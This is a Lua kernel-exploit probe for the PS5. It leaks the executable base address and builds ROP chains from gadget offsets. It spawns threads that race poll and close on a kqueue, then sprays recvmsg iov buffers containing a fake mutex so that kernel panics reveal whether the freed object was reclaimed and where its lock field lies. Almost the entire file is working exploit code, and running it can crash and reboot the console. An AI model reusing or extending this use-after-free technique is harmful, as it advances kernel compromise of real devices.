-- CRASH_CLASS: RISKY (kernel panic = PS5 reboot if spray reclaims)
-- PROBE 500k: Crash oracle for reclaim detection + si_mtx offset
--
-- Context: 500j proved 500h "canary modified" was a Lua precision false
-- positive. mtx_lock/unlock is a no-op neto on the fake mutex. We need a
-- crash oracle: if seltdclear reads an unmapped address as si_mtx, the
-- kernel panics on mtx_lock. A panic = the spray DID reclaim.
--
-- Strategy (2 iterations):
--   Iter 1: qword 17 (kqueue+0x88) = &fake_mtx (valid), all others = 0x100
--           If process lives → si_mtx at qword 17 OR no reclaim
--           If kernel panics → si_mtx NOT at qword 17, but reclaim works
--   Iter 2: ALL qwords = 0x100 (unmapped userland → crash if dereferenced)
--           If process lives → NO RECLAIM (spray doesn't work)
--           If kernel panics → RECLAIM CONFIRMED
--
-- Combined interpretation:
--   iter1=live + iter2=panic → si_mtx at qword 17, reclaim works  [BEST]
--   iter1=live + iter2=live  → no reclaim (need different spray)   [BAD]
--   iter1=panic              → reclaim works, si_mtx NOT at 17     [SEARCH]

print("=== PROBE 500k: CRASH ORACLE (reclaim + offset) ===")
print("")
print("WARNING: if spray reclaims and si_mtx hits an unmapped pointer,")
print("the kernel will panic and the PS5 will reboot.")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Fake TCB for child threads
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))
local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

-- SIG_IGN for SIGSEGV/SIGBUS/SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

-- ===== Fake mutex =====
-- lo_name at +0x00, lo_flags at +0x08, lo_data at +0x0C, mtx_lock at +0x10
local fake_mtx = memory.alloc(0x30)
for i = 0, 0x2C, 4 do wd(N(fake_mtx) + i, 0) end
wq(N(fake_mtx), uint64(N(fake_mtx) + 0x20))  -- lo_name -> "M\0"
wd(N(fake_mtx) + 8, 1)                         -- lo_flags = 1
wd(N(fake_mtx) + 0xC, 0)                       -- lo_data
wq(N(fake_mtx) + 0x10, uint64(4))              -- mtx_lock = MTX_UNOWNED
wq(N(fake_mtx) + 0x20, uint64(0x4D))           -- "M\0" string
local fake_mtx_addr = uint64(N(fake_mtx))
print("fake_mtx=" .. fmt(fake_mtx_addr))
print("")

-- ===== Thread builders =====
local function build_poller(gate_rd, pollfd_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rdi); emit(uint64(pollfd_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(3000))
    emit(g_pop_rax); emit(uint64(209)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function build_closer(gate_rd, target_fd, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rdi); emit(uint64(target_fd))
    emit(g_pop_rax); emit(uint64(6)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function build_spray_child(gate_rd, sock_rd, msghdr_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rax); emit(uint64(1))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(sock_rd))
    emit(g_pop_rsi); emit(uint64(msghdr_addr))
    emit(g_pop_rdx); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(29)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- ===== Race iteration =====
local CRASH_VAL = uint64(0x100)  -- unmapped userland → kernel panic if dereferenced
local NUM_SPRAY = 15             -- more spray children for better reclaim odds
local SI_MTX_QWORD = 17         -- estimated si_mtx at kqueue+0x88 = qword 17
local sc_kqueue = mk(362)

local function run_oracle(label, si_mtx_pos)
    -- si_mtx_pos: qword index that gets &fake_mtx (valid). -1 = ALL crash values.
    print("[" .. label .. "]")
    if si_mtx_pos >= 0 then
        print("  qword " .. si_mtx_pos .. " = &fake_mtx (valid), others = 0x100 (crash)")
    else
        print("  ALL qwords = 0x100 (crash if any is si_mtx)")
    end

    -- Reset fake_mtx
    wq(N(fake_mtx), uint64(N(fake_mtx) + 0x20))
    wd(N(fake_mtx) + 8, 1)
    wd(N(fake_mtx) + 0xC, 0)
    wq(N(fake_mtx) + 0x10, uint64(4))

    -- Build iov buffer
    local iov_buf = memory.alloc(256 + 16)
    for q = 0, 31 do
        if q == si_mtx_pos then
            wq(N(iov_buf) + q * 8, fake_mtx_addr)
        else
            wq(N(iov_buf) + q * 8, CRASH_VAL)
        end
    end

    -- Create kqueue
    local kq = sgn(sc_kqueue())
    if kq < 0 then print("  kqueue FAIL"); return "fail" end
    print("  kq_fd=" .. kq)

    -- Gates for poller and closer
    local gA_r, gA_w = make_gate()
    local gB_r, gB_w = make_gate()
    if not gA_r or not gB_r then
        pcall(function() mk(6)(uint64(kq)) end)
        print("  gate FAIL"); return "fail"
    end

    -- Build msghdr for spray children
    local function make_msghdr()
        local mh = memory.alloc(0x30)
        wq(N(mh), uint64(0))
        wd(N(mh) + 8, 0)
        wq(N(mh) + 0x10, uint64(N(iov_buf)))
        wd(N(mh) + 0x18, 16)
        wq(N(mh) + 0x20, uint64(0))
        wd(N(mh) + 0x28, 0)
        wd(N(mh) + 0x2C, 0)
        return mh
    end

    -- Launch spray children
    local spray = {}
    for s = 1, NUM_SPRAY do
        local sv = memory.alloc(8)
        wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
        pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
        local sr = rd(N(sv)) or 0xFFFF
        local sw = rd(N(sv) + 4) or 0xFFFF
        local gr, gw = make_gate()
        local smk = memory.alloc(8); wd(N(smk), 0); wd(N(smk) + 4, 0)
        local mh = make_msghdr()
        if sr ~= 0xFFFF and gr then
            pcall(function()
                mk(455)(build_spray_child(gr, sr, N(mh), N(smk)), uint64(0x38))
            end)
            spray[#spray + 1] = {rd=sr, wr=sw, gr=gr, gw=gw, mk=smk}
        end
    end
    print("  spray=" .. #spray)

    -- Poller + closer
    local pollfd = memory.alloc(8)
    wd(N(pollfd), kq); wd(N(pollfd) + 4, 0x00010000)
    local mA = memory.alloc(8); wd(N(mA), 0); wd(N(mA) + 4, 0xAA)
    local mB = memory.alloc(8); wd(N(mB), 0); wd(N(mB) + 4, 0xBB)

    pcall(function() mk(455)(build_poller(gA_r, N(pollfd), N(mA)), uint64(0x38)) end)
    pcall(function() mk(455)(build_closer(gB_r, kq, N(mB)), uint64(0x38)) end)

    -- Open poller gate
    pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)
    for d = 1, 50000 do local _ = rd(N(mA)) end  -- ~5ms delay

    -- Open closer gate
    pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)

    -- Wait for close to complete
    for w = 1, 300000 do
        if rd(N(mB) + 4) ~= 0xBB then break end
    end
    if not alive() then return "died_close" end

    -- Open spray gates
    for _, sd in ipairs(spray) do
        pcall(function() mk(4)(uint64(sd.gw), uint64(N(one_byte)), uint64(1)) end)
    end

    -- Brief delay for spray to enter recvmsg
    for d = 1, 200000 do local _ = rd(N(mA)) end

    -- Wait for poll to complete (timeout ~3s)
    -- If kernel panics during seltdclear, we never get here
    for w = 1, 8000000 do
        if not alive() then return "died_seltdclear" end
        if rd(N(mA) + 4) ~= 0xAA then break end
    end

    if not alive() then return "died_after" end

    -- Check poll result
    local poll_rv = rq(uint64(N(mA)))
    print("  poll_rv=" .. fmt(poll_rv))
    print("  fake_mtx.mtx_lock=" .. fmt(rq(uint64(N(fake_mtx) + 0x10))))

    -- Cleanup
    for _, sd in ipairs(spray) do
        pcall(function() mk(6)(uint64(sd.rd)) end)
        pcall(function() mk(6)(uint64(sd.wr)) end)
        pcall(function() mk(6)(uint64(sd.gr)) end)
        pcall(function() mk(6)(uint64(sd.gw)) end)
    end
    pcall(function() mk(6)(uint64(gA_r)) end); pcall(function() mk(6)(uint64(gA_w)) end)
    pcall(function() mk(6)(uint64(gB_r)) end); pcall(function() mk(6)(uint64(gB_w)) end)

    print("  SURVIVED")
    return "live"
end

-- ===== Run tests =====

-- Iter 1: offset test — qword 17 valid, others crash
print("")
local r1 = run_oracle("ITER 1/2: offset test (qw17=valid)", SI_MTX_QWORD)
print("  result=" .. tostring(r1))
print("")

if not alive() then
    print("Process died in iter 1 — kernel panic or process killed")
    print("If PS5 rebooted: si_mtx is NOT at qword 17, but reclaim WORKS")
    print("=== PROBE 500k COMPLETE (partial) ===")
    return
end

-- Iter 2: reclaim test — ALL crash values
local r2 = run_oracle("ITER 2/2: reclaim test (all=crash)", -1)
print("  result=" .. tostring(r2))
print("")

-- ===== Interpretation =====
print("========================================")
print("RESULTS:")
print("  iter1 (offset@17): " .. tostring(r1))
print("  iter2 (all-crash):  " .. tostring(r2))
print("")

if r1 == "live" and r2 == "live" then
    print("INTERPRETATION: NO RECLAIM")
    print("The iov spray did not reclaim the freed kqueue slot.")
    print("Need: more spray children, different timing, or different spray vector.")
elseif r1 == "live" then
    -- r2 caused death/reboot (we won't see this output)
    print("INTERPRETATION: si_mtx at qword 17 + reclaim confirmed")
else
    print("INTERPRETATION: unexpected result combination")
end

print("")
print("alive=" .. tostring(alive()))
print("=== PROBE 500k COMPLETE ===")
